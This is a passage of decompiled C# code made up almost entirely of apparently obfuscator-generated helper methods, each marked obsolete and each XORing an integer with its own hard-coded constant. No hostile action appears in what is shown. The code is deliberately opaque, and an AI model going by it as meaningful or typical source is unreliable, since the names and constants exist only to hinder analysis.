	public static int smethod_1261(int int_4)
	{
		return int_4 ^ 0x23E9B7EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1262(int int_4)
	{
		return int_4 ^ 0x70756C2C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1263(int int_4)
	{
		return int_4 ^ 0x3B7A4FDA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1264(int int_4)
	{
		return int_4 ^ 0x1D431835;
	}

	[Obsolete("Exclude")]
	public static int smethod_1265(int int_4)
	{
		return int_4 ^ 0x7D36013E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1266(int int_4)
	{
		return int_4 ^ 0x7D6ED28C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1267(int int_4)
	{
		return int_4 ^ 0x28B10C03;
	}

	[Obsolete("Exclude")]
	public static int smethod_1268(int int_4)
	{
		return int_4 ^ 0x7794FB9D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1269(int int_4)
	{
		return int_4 ^ 0x284C4394;
	}

	[Obsolete("Exclude")]
	public static int smethod_1270(int int_4)
	{
		return int_4 ^ 0x44FFAA2B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1271(int int_4)
	{
		return int_4 ^ 0x74A4F4BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1272(int int_4)
	{
		return int_4 ^ 0x1DDD1C33;
	}

	[Obsolete("Exclude")]
	public static int smethod_1273(int int_4)
	{
		return int_4 ^ 0x2F82767F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1274(int int_4)
	{
		return int_4 ^ 0x1F02A68A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1275(int int_4)
	{
		return int_4 ^ 0x42F62AC6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1276(int int_4)
	{
		return int_4 ^ 0x6D9688F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1277(int int_4)
	{
		return int_4 ^ 0x32A9D37E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1278(int int_4)
	{
		return int_4 ^ 0x5D249C23;
	}

	[Obsolete("Exclude")]
	public static int smethod_1279(int int_4)
	{
		return int_4 ^ 0x1E4027B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1280(int int_4)
	{
		return int_4 ^ 0x38BF8F48;
	}

	[Obsolete("Exclude")]
	public static int smethod_1281(int int_4)
	{
		return int_4 ^ 0x4B4DA87C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1282(int int_4)
	{
		return int_4 ^ 0x20F08E20;
	}

	[Obsolete("Exclude")]
	public static int smethod_1283(int int_4)
	{
		return int_4 ^ 0x6D47AA55;
	}

	[Obsolete("Exclude")]
	public static int smethod_1284(int int_4)
	{
		return int_4 ^ 0x29D33A94;
	}

	[Obsolete("Exclude")]
	public static int smethod_1285(int int_4)
	{
		return int_4 ^ 0x6A88E821;
	}

	[Obsolete("Exclude")]
	public static int smethod_1286(int int_4)
	{
		return int_4 ^ 0x608A97C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1287(int int_4)
	{
		return int_4 ^ 0x2C83A9D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1288(int int_4)
	{
		return int_4 ^ 0x1425F368;
	}

	[Obsolete("Exclude")]
	public static int smethod_1289(int int_4)
	{
		return int_4 ^ 0x91AC86D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1290(int int_4)
	{
		return int_4 ^ 0x588A5A4B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1291(int int_4)
	{
		return int_4 ^ 0x3AC097B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1292(int int_4)
	{
		return int_4 ^ 0x1AB5A6C7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1293(int int_4)
	{
		return int_4 ^ 0x7C414392;
	}

	[Obsolete("Exclude")]
	public static int smethod_1294(int int_4)
	{
		return int_4 ^ 0x1E33E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1295(int int_4)
	{
		return int_4 ^ 0x2744AAA3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1296(int int_4)
	{
		return int_4 ^ 0xE07B2EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1297(int int_4)
	{
		return int_4 ^ 0x36B3648A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1298(int int_4)
	{
		return int_4 ^ 0x212785AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1299(int int_4)
	{
		return int_4 ^ 0x10F5DDF8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1300(int int_4)
	{
		return int_4 ^ 0x21BEF782;
	}

	[Obsolete("Exclude")]
	public static int smethod_1301(int int_4)
	{
		return int_4 ^ 0x14D93EFB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1302(int int_4)
	{
		return int_4 ^ 0x47E44FF0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1303(int int_4)
	{
		return int_4 ^ 0x72241DB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1304(int int_4)
	{
		return int_4 ^ 0x6C535800;
	}

	[Obsolete("Exclude")]
	public static int smethod_1305(int int_4)
	{
		return int_4 ^ 0x27CCFEEE;
	}

	[Obsolete("Exclude")]
	public static int smethod_1306(int int_4)
	{
		return int_4 ^ 0x29C741F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1307(int int_4)
	{
		return int_4 ^ 0x76394ECD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1308(int int_4)
	{
		return int_4 ^ 0x304E8A80;
	}

	[Obsolete("Exclude")]
	public static int smethod_1309(int int_4)
	{
		return int_4 ^ 0x363AF83;
	}

	[Obsolete("Exclude")]
	public static int smethod_1310(int int_4)
	{
		return int_4 ^ 0x69862597;
	}

	[Obsolete("Exclude")]
	public static int smethod_1311(int int_4)
	{
		return int_4 ^ 0x40D64E74;
	}

	[Obsolete("Exclude")]
	public static int smethod_1312(int int_4)
	{
		return int_4 ^ 0x3833F9E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1313(int int_4)
	{
		return int_4 ^ 0x7FF73C1D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1314(int int_4)
	{
		return int_4 ^ 0x4CF449CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1315(int int_4)
	{
		return int_4 ^ 0x4AB7EBBA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1316(int int_4)
	{
		return int_4 ^ 0x16AEFB14;
	}

	[Obsolete("Exclude")]
	public static int smethod_1317(int int_4)
	{
		return int_4 ^ 0x479D54E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1318(int int_4)
	{
		return int_4 ^ 0x69254502;
	}

	[Obsolete("Exclude")]
	public static int smethod_1319(int int_4)
	{
		return int_4 ^ 0x36C13425;
	}

	[Obsolete("Exclude")]
	public static int smethod_1320(int int_4)
	{
		return int_4 ^ 0x172CE6D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1321(int int_4)
	{
		return int_4 ^ 0x4E782AEB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1322(int int_4)
	{
		return int_4 ^ 0x1CE344E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1323(int int_4)
	{
		return int_4 ^ 0x3B7909E6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1324(int int_4)
	{
		return int_4 ^ 0x285746C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1325(int int_4)
	{
		return int_4 ^ 0x148BC114;
	}

	[Obsolete("Exclude")]
	public static int smethod_1326(int int_4)
	{
		return int_4 ^ 0x2F29B09A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1327(int int_4)
	{
		return int_4 ^ 0x11F5E9B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1328(int int_4)
	{
		return int_4 ^ 0x10986212;
	}

	[Obsolete("Exclude")]
	public static int smethod_1329(int int_4)
	{
		return int_4 ^ 0x7F46CA94;
	}

	[Obsolete("Exclude")]
	public static int smethod_1330(int int_4)
	{
		return int_4 ^ 0x5887885;
	}

	[Obsolete("Exclude")]
	public static int smethod_1331(int int_4)
	{
		return int_4 ^ 0x785D677F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1332(int int_4)
	{
		return int_4 ^ 0x2E32EFB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1333(int int_4)
	{
		return int_4 ^ 0x7F953584;
	}

	[Obsolete("Exclude")]
	public static int smethod_1334(int int_4)
	{
		return int_4 ^ 0x320893DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1335(int int_4)
	{
		return int_4 ^ 0x34F3ED30;
	}

	[Obsolete("Exclude")]
	public static int smethod_1336(int int_4)
	{
		return int_4 ^ 0x69174904;
	}

	[Obsolete("Exclude")]
	public static int smethod_1337(int int_4)
	{
		return int_4 ^ 0x7220B400;
	}

	[Obsolete("Exclude")]
	public static int smethod_1338(int int_4)
	{
		return int_4 ^ 0x229E0BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1339(int int_4)
	{
		return int_4 ^ 0x17FD1FD3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1340(int int_4)
	{
		return int_4 ^ 0x9169EDA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1341(int int_4)
	{
		return int_4 ^ 0x1382C884;
	}

	[Obsolete("Exclude")]
	public static int smethod_1342(int int_4)
	{
		return int_4 ^ 0x4BFBF9D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1343(int int_4)
	{
		return int_4 ^ 0x5A3C5C9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1344(int int_4)
	{
		return int_4 ^ 0x195F20AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1345(int int_4)
	{
		return int_4 ^ 0x552E232A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1346(int int_4)
	{
		return int_4 ^ 0x115A5225;
	}

	[Obsolete("Exclude")]
	public static int smethod_1347(int int_4)
	{
		return int_4 ^ 0x519E236;
	}

	[Obsolete("Exclude")]
	public static int smethod_1348(int int_4)
	{
		return int_4 ^ 0x40ADE81B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1349(int int_4)
	{
		return int_4 ^ 0x2374C90B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1350(int int_4)
	{
		return int_4 ^ 0x5D30BAD8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1351(int int_4)
	{
		return int_4 ^ 0x76D35120;
	}

	[Obsolete("Exclude")]
	public static int smethod_1352(int int_4)
	{
		return int_4 ^ 0x379F7FA9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1353(int int_4)
	{
		return int_4 ^ 0x1E44000E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1354(int int_4)
	{
		return int_4 ^ 0x209A1E6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1355(int int_4)
	{
		return int_4 ^ 0x37E76DE1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1356(int int_4)
	{
		return int_4 ^ 0x1F093AE7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1357(int int_4)
	{
		return int_4 ^ 0x7E1D1CB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1358(int int_4)
	{
		return int_4 ^ 0x4D9F01E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1359(int int_4)
	{
		return int_4 ^ 0x7170E7C7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1360(int int_4)
	{
		return int_4 ^ 0x35B3D210;
	}

	[Obsolete("Exclude")]
	public static int smethod_1361(int int_4)
	{
		return int_4 ^ 0x4AF722BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1362(int int_4)
	{
		return int_4 ^ 0x2662C216;
	}

	[Obsolete("Exclude")]
	public static int smethod_1363(int int_4)
	{
		return int_4 ^ 0xC990073;
	}

	[Obsolete("Exclude")]
	public static int smethod_1364(int int_4)
	{
		return int_4 ^ 0x57869692;
	}

	[Obsolete("Exclude")]
	public static int smethod_1365(int int_4)
	{
		return int_4 ^ 0x7052869E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1366(int int_4)
	{
		return int_4 ^ 0x77845D7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1367(int int_4)
	{
		return int_4 ^ 0x14EF84B7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1368(int int_4)
	{
		return int_4 ^ 0xC681EAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1369(int int_4)
	{
		return int_4 ^ 0x72E761CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1370(int int_4)
	{
		return int_4 ^ 0x361CDAE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1371(int int_4)
	{
		return int_4 ^ 0x7F886569;
	}

	[Obsolete("Exclude")]
	public static int smethod_1372(int int_4)
	{
		return int_4 ^ 0x749B5B55;
	}

	[Obsolete("Exclude")]
	public static int smethod_1373(int int_4)
	{
		return int_4 ^ 0x1A540F71;
	}

	[Obsolete("Exclude")]
	public static int smethod_1374(int int_4)
	{
		return int_4 ^ 0x77DA68B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1375(int int_4)
	{
		return int_4 ^ 0x5B23BEE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1376(int int_4)
	{
		return int_4 ^ 0x279EDA18;
	}

	[Obsolete("Exclude")]
	public static int smethod_1377(int int_4)
	{
		return int_4 ^ 0x7730210A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1378(int int_4)
	{
		return int_4 ^ 0x5B7C93FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_1379(int int_4)
	{
		return int_4 ^ 0x25FFA868;
	}

	[Obsolete("Exclude")]
	public static int smethod_1380(int int_4)
	{
		return int_4 ^ 0x3E2EF7EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1381(int int_4)
	{
		return int_4 ^ 0x672EFBFF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1382(int int_4)
	{
		return int_4 ^ 0x449C9ADA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1383(int int_4)
	{
		return int_4 ^ 0x7BE91979;
	}

	[Obsolete("Exclude")]
	public static int smethod_1384(int int_4)
	{
		return int_4 ^ 0x7B1DC914;
	}

	[Obsolete("Exclude")]
	public static int smethod_1385(int int_4)
	{
		return int_4 ^ 0x306A640C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1386(int int_4)
	{
		return int_4 ^ 0x59CD283C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1387(int int_4)
	{
		return int_4 ^ 0x67CEF3BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_1388(int int_4)
	{
		return int_4 ^ 0x5F38EE00;
	}

	[Obsolete("Exclude")]
	public static int smethod_1389(int int_4)
	{
		return int_4 ^ 0x2ECDEEC2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1390(int int_4)
	{
		return int_4 ^ 0x11DDA034;
	}

	[Obsolete("Exclude")]
	public static int smethod_1391(int int_4)
	{
		return int_4 ^ 0x5EE405C2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1392(int int_4)
	{
		return int_4 ^ 0x7D5490ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_1393(int int_4)
	{
		return int_4 ^ 0x43EABC6F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1394(int int_4)
	{
		return int_4 ^ 0x63702814;
	}

	[Obsolete("Exclude")]
	public static int smethod_1395(int int_4)
	{
		return int_4 ^ 0x3FE0338;
	}

	[Obsolete("Exclude")]
	public static int smethod_1396(int int_4)
	{
		return int_4 ^ 0x6601E6F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_1397(int int_4)
	{
		return int_4 ^ 0x51F1F489;
	}

	[Obsolete("Exclude")]
	public static int smethod_1398(int int_4)
	{
		return int_4 ^ 0x5BBB4812;
	}

	[Obsolete("Exclude")]
	public static int smethod_1399(int int_4)
	{
		return int_4 ^ 0x4B3AE729;
	}

	[Obsolete("Exclude")]
	public static int smethod_1400(int int_4)
	{
		return int_4 ^ 0x7B9DAF2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1401(int int_4)
	{
		return int_4 ^ 0x1D0655E9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1402(int int_4)
	{
		return int_4 ^ 0x2C5E5C58;
	}

	[Obsolete("Exclude")]
	public static int smethod_1403(int int_4)
	{
		return int_4 ^ 0x4B816437;
	}

	[Obsolete("Exclude")]
	public static int smethod_1404(int int_4)
	{
		return int_4 ^ 0x74CEA868;
	}

	[Obsolete("Exclude")]
	public static int smethod_1405(int int_4)
	{
		return int_4 ^ 0xDF4A2D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1406(int int_4)
	{
		return int_4 ^ 0x59DBDA30;
	}

	[Obsolete("Exclude")]
	public static int smethod_1407(int int_4)
	{
		return int_4 ^ 0x30930DD7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1408(int int_4)
	{
		return int_4 ^ 0x3CA78D25;
	}

	[Obsolete("Exclude")]
	public static int smethod_1409(int int_4)
	{
		return int_4 ^ 0x59A3A598;
	}

	[Obsolete("Exclude")]
	public static int smethod_1410(int int_4)
	{
		return int_4 ^ 0x254B80AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1411(int int_4)
	{
		return int_4 ^ 0x5F1743C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1412(int int_4)
	{
		return int_4 ^ 0x5AE5A448;
	}

	[Obsolete("Exclude")]
	public static int smethod_1413(int int_4)
	{
		return int_4 ^ 0x458C02B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1414(int int_4)
	{
		return int_4 ^ 0x4376F762;
	}

	[Obsolete("Exclude")]
	public static int smethod_1415(int int_4)
	{
		return int_4 ^ 0x3437FC38;
	}

	[Obsolete("Exclude")]
	public static int smethod_1416(int int_4)
	{
		return int_4 ^ 0x748D1E56;
	}

	[Obsolete("Exclude")]
	public static int smethod_1417(int int_4)
	{
		return int_4 ^ 0x70D3A9A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1418(int int_4)
	{
		return int_4 ^ 0x240CF652;
	}

	[Obsolete("Exclude")]
	public static int smethod_1419(int int_4)
	{
		return int_4 ^ 0x6C94D030;
	}

	[Obsolete("Exclude")]
	public static int smethod_1420(int int_4)
	{
		return int_4 ^ 0xB94F64D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1421(int int_4)
	{
		return int_4 ^ 0x6E5D677B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1422(int int_4)
	{
		return int_4 ^ 0x47F91686;
	}

	[Obsolete("Exclude")]
	public static int smethod_1423(int int_4)
	{
		return int_4 ^ 0x135A248E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1424(int int_4)
	{
		return int_4 ^ 0x785E8590;
	}

	[Obsolete("Exclude")]
	public static int smethod_1425(int int_4)
	{
		return int_4 ^ 0x2C82868B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1426(int int_4)
	{
		return int_4 ^ 0x44B6C44C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1427(int int_4)
	{
		return int_4 ^ 0x1743581F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1428(int int_4)
	{
		return int_4 ^ 0xF4DFD17;
	}

	[Obsolete("Exclude")]
	public static int smethod_1429(int int_4)
	{
		return int_4 ^ 0x6FCD263;
	}

	[Obsolete("Exclude")]
	public static int smethod_1430(int int_4)
	{
		return int_4 ^ 0x8DBE8BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1431(int int_4)
	{
		return int_4 ^ 0x667AA2EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1432(int int_4)
	{
		return int_4 ^ 0x7FF69F76;
	}

	[Obsolete("Exclude")]
	public static int smethod_1433(int int_4)
	{
		return int_4 ^ 0x33C39967;
	}

	[Obsolete("Exclude")]
	public static int smethod_1434(int int_4)
	{
		return int_4 ^ 0x59362573;
	}

	[Obsolete("Exclude")]
	public static int smethod_1435(int int_4)
	{
		return int_4 ^ 0x7BC23A82;
	}

	[Obsolete("Exclude")]
	public static int smethod_1436(int int_4)
	{
		return int_4 ^ 0x3BFCCA40;
	}

	[Obsolete("Exclude")]
	public static int smethod_1437(int int_4)
	{
		return int_4 ^ 0x2C7FCCDD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1438(int int_4)
	{
		return int_4 ^ 0x6324F662;
	}

	[Obsolete("Exclude")]
	public static int smethod_1439(int int_4)
	{
		return int_4 ^ 0x4201D878;
	}

	[Obsolete("Exclude")]
	public static int smethod_1440(int int_4)
	{
		return int_4 ^ 0x2E0E90B0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1441(int int_4)
	{
		return int_4 ^ 0x5CC57122;
	}

	[Obsolete("Exclude")]
	public static int smethod_1442(int int_4)
	{
		return int_4 ^ 0x31783E29;
	}

	[Obsolete("Exclude")]
	public static int smethod_1443(int int_4)
	{
		return int_4 ^ 0x167A144D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1444(int int_4)
	{
		return int_4 ^ 0x3A6F2740;
	}

	[Obsolete("Exclude")]
	public static int smethod_1445(int int_4)
	{
		return int_4 ^ 0x6A53BBF6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1446(int int_4)
	{
		return int_4 ^ 0x71A46879;
	}

	[Obsolete("Exclude")]
	public static int smethod_1447(int int_4)
	{
		return int_4 ^ 0x3E99BBC6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1448(int int_4)
	{
		return int_4 ^ 0x1CAAAFD5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1449(int int_4)
	{
		return int_4 ^ 0x3256141A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1450(int int_4)
	{
		return int_4 ^ 0x37549118;
	}

	[Obsolete("Exclude")]
	public static int smethod_1451(int int_4)
	{
		return int_4 ^ 0x6BCC6237;
	}

	[Obsolete("Exclude")]
	public static int smethod_1452(int int_4)
	{
		return int_4 ^ 0x59D4230B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1453(int int_4)
	{
		return int_4 ^ 0x3803DC8F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1454(int int_4)
	{
		return int_4 ^ 0x42C23E0D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1455(int int_4)
	{
		return int_4 ^ 0x3A679E42;
	}

	[Obsolete("Exclude")]
	public static int smethod_1456(int int_4)
	{
		return int_4 ^ 0x7D4F2D97;
	}

	[Obsolete("Exclude")]
	public static int smethod_1457(int int_4)
	{
		return int_4 ^ 0x433C89D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1458(int int_4)
	{
		return int_4 ^ 0x2FF66F91;
	}

	[Obsolete("Exclude")]
	public static int smethod_1459(int int_4)
	{
		return int_4 ^ 0x450610AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1460(int int_4)
	{
		return int_4 ^ 0x57A6F987;
	}

	[Obsolete("Exclude")]
	public static int smethod_1461(int int_4)
	{
		return int_4 ^ 0x290F6EF3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1462(int int_4)
	{
		return int_4 ^ 0x32F15BF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1463(int int_4)
	{
		return int_4 ^ 0x663C775B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1464(int int_4)
	{
		return int_4 ^ 0x30D64782;
	}

	[Obsolete("Exclude")]
	public static int smethod_1465(int int_4)
	{
		return int_4 ^ 0x4D948EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1466(int int_4)
	{
		return int_4 ^ 0x3DF36FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1467(int int_4)
	{
		return int_4 ^ 0x7DE972A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1468(int int_4)
	{
		return int_4 ^ 0x5AEB9CD6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1469(int int_4)
	{
		return int_4 ^ 0x32F54535;
	}

	[Obsolete("Exclude")]
	public static int smethod_1470(int int_4)
	{
		return int_4 ^ 0x538F81D4;
	}

	[Obsolete("Exclude")]
	public static int smethod_1471(int int_4)
	{
		return int_4 ^ 0x7ECB5278;
	}

	[Obsolete("Exclude")]
	public static int smethod_1472(int int_4)
	{
		return int_4 ^ 0x64E50207;
	}

	[Obsolete("Exclude")]
	public static int smethod_1473(int int_4)
	{
		return int_4 ^ 0x1036EFE6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1474(int int_4)
	{
		return int_4 ^ 0x44C3A653;
	}

	[Obsolete("Exclude")]
	public static int smethod_1475(int int_4)
	{
		return int_4 ^ 0x13BD4AAA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1476(int int_4)
	{
		return int_4 ^ 0x65B405C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1477(int int_4)
	{
		return int_4 ^ 0x641FB649;
	}

	[Obsolete("Exclude")]
	public static int smethod_1478(int int_4)
	{
		return int_4 ^ 0x1AF1A10B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1479(int int_4)
	{
		return int_4 ^ 0x69D4597E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1480(int int_4)
	{
		return int_4 ^ 0xBAAB08A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1481(int int_4)
	{
		return int_4 ^ 0xD610C44;
	}

	[Obsolete("Exclude")]
	public static int smethod_1482(int int_4)
	{
		return int_4 ^ 0x5D65DE92;
	}

	[Obsolete("Exclude")]
	public static int smethod_1483(int int_4)
	{
		return int_4 ^ 0x673AE2E2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1484(int int_4)
	{
		return int_4 ^ 0x4593DB3C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1485(int int_4)
	{
		return int_4 ^ 0x7BEDCDD7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1486(int int_4)
	{
		return int_4 ^ 0x5CF9F0A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1487(int int_4)
	{
		return int_4 ^ 0x48E3BDC7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1488(int int_4)
	{
		return int_4 ^ 0x26A3415C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1489(int int_4)
	{
		return int_4 ^ 0x40199BFB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1490(int int_4)
	{
		return int_4 ^ 0x58052CE2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1491(int int_4)
	{
		return int_4 ^ 0x5D65703A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1492(int int_4)
	{
		return int_4 ^ 0x4F79BD5B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1493(int int_4)
	{
		return int_4 ^ 0x45776B64;
	}

	[Obsolete("Exclude")]
	public static int smethod_1494(int int_4)
	{
		return int_4 ^ 0x1F3760A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1495(int int_4)
	{
		return int_4 ^ 0x28E84E46;
	}

	[Obsolete("Exclude")]
	public static int smethod_1496(int int_4)
	{
		return int_4 ^ 0x7D6CB5C7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1497(int int_4)
	{
		return int_4 ^ 0x6D9BA9EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_1498(int int_4)
	{
		return int_4 ^ 0xB8A7B98;
	}

	[Obsolete("Exclude")]
	public static int smethod_1499(int int_4)
	{
		return int_4 ^ 0x15976E34;
	}

	[Obsolete("Exclude")]
	public static int smethod_1500(int int_4)
	{
		return int_4 ^ 0x30A1C28E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1501(int int_4)
	{
		return int_4 ^ 0x20AB1B16;
	}

	[Obsolete("Exclude")]
	public static int smethod_1502(int int_4)
	{
		return int_4 ^ 0x4CA9CB88;
	}

	[Obsolete("Exclude")]
	public static int smethod_1503(int int_4)
	{
		return int_4 ^ 0x7BFB6E73;
	}

	[Obsolete("Exclude")]
	public static int smethod_1504(int int_4)
	{
		return int_4 ^ 0x42D1B53B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1505(int int_4)
	{
		return int_4 ^ 0x4EF11A9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1506(int int_4)
	{
		return int_4 ^ 0xAA05A2E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1507(int int_4)
	{
		return int_4 ^ 0x5DA12365;
	}

	[Obsolete("Exclude")]
	public static int smethod_1508(int int_4)
	{
		return int_4 ^ 0x45DD0E98;
	}

	[Obsolete("Exclude")]
	public static int smethod_1509(int int_4)
	{
		return int_4 ^ 0x6A46ADC0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1510(int int_4)
	{
		return int_4 ^ 0x903A5ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_1511(int int_4)
	{
		return int_4 ^ 0x268A6C25;
	}

	[Obsolete("Exclude")]
	public static int smethod_1512(int int_4)
	{
		return int_4 ^ 0x603D57EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1513(int int_4)
	{
		return int_4 ^ 0x1FFC0EB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1514(int int_4)
	{
		return int_4 ^ 0x77CF7EFB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1515(int int_4)
	{
		return int_4 ^ 0x767928D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1516(int int_4)
	{
		return int_4 ^ 0x3F3B8C87;
	}

	[Obsolete("Exclude")]
	public static int smethod_1517(int int_4)
	{
		return int_4 ^ 0x11DE79D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1518(int int_4)
	{
		return int_4 ^ 0x752442A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1519(int int_4)
	{
		return int_4 ^ 0x691BBDDA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1520(int int_4)
	{
		return int_4 ^ 0x511DF67F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1521(int int_4)
	{
		return int_4 ^ 0x74F3C915;
	}

